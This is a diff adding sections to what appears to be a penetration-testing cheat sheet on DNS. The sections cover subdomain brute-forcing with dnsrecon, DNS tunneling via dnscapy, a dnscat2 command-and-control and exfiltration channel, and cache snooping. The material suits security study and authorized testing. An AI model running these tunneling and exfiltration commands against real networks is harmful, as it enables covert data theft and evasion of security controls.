@@ -91,7 +91,72 @@ dig axfr @$DNS_IP $DOMAIN
 fierce --domain $DOMAIN --dns-servers $DNS_IP
 ```
 
+### Enumerate Hosts and Subdomains Brute Force
+DNSRecon is a Python script for comprehensive DNS enumeration, including zone transfers, record lookups, brute-forcing, wildcard checks, TLD expansion, and cached record analysis.
+
+```bash
+# To enumerate subdomains of microsoft.com
+dnsrecon -d microsoft.com
+
+# Scan a domain, use a dictionary to brute force hostnames, do a standard scan, and save the output to a file
+dnsrecon -d example.com -D $WORDLIST -t std --xml $OUTPUT.xml
+```
+
+### Google dorks
+```dork
+site:thehacker.recipes
+```
+
+## Attack
+
+### DNS Tunneling
+DNS tunneling is commonly used to circumvent security. Tunneling can be used for benign reasons. For example, an anti-virus update done by endpoint software.
+However, it is also used for more malicious purposes, such as evading captive portals.
+
+#### Setup using dnscapy
+
+```bash
+# On the server
+sudo python dnscapy_server.py $DELEGATED_ZONE_NAME $EXTERNAL_IP_ADDR
+
+# On the client
+ssh -o ProxyCommand="sudo python dnscapy_client.py $DELEGATED_ZONE_NAME $IP_ADDR_OF_CLIENT_DNS" yourlogin@localhost
+```
+## Post-Exploitation
+
+
+### DNS Exfiltration
+DNS exfiltration is a technique where attackers encode data in DNS queries to steal information.
+
+Exfiltration with dnscat2
+
+This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.
+
+```bash
+# Server side
+dnscat2 --dns server=$DNS_SERVER_IP:53
+
+# Client side
+dnscat2 $DOMAIN
+```
+### Cache Snooping
+
+DNS cache snooping is a technique that can be employed for different purposes by those seeking to benefit from knowledge of what queries have been made of a recursive DNS server by its clients.
+
+```bash
+dig @$DNS-SERVER $DOMAIN +norecurse
+```
+
+
+
+
+
+
+
 
 
 ## Resources
-https://academy.hackthebox.com/module/144/section/1251
+[Information Gathering-Web Edition](https://academy.hackthebox.com/module/144/section/1251)  
+[Kali dnsrecon](https://www.kali.org/tools/dnsrecon)  
+[DNS Attack](https://bluecatnetworks.com/blog/four-major-dns-attack-types-and-how-to-mitigate-them)  
+[DNS Tunelling](https://www.blackhat.com/presentations/bh-usa-08/Miller/BH_US_08_Ty_Miller_Reverse_DNS_Tunneling_Shellcode.pdf)  
